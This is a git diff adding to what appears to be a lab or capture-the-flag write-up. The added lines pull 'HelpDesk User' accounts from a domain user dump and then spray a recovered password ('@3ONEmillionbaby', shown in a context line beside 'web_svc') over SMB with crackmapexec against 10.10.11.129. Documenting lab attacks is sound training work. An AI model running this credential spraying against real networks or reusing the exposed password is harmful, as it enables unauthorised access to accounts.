@@ -33,3 +33,19 @@ web_svc | @3ONEmillionbaby
 
 ![image](https://user-images.githubusercontent.com/33616880/230699760-4770c7a8-b7ee-4a9d-9398-d2298e8863e4.png)
 
+
+```
+grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
+```
+![image](https://user-images.githubusercontent.com/33616880/230700117-68ed59b8-9ab2-4831-be38-7421ada171f7.png)
+
+
+
+```
+crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
+```
+![image](https://user-images.githubusercontent.com/33616880/230700260-1809d1ec-e297-4d00-9ba5-5213526fed84.png)
+
+
+
+
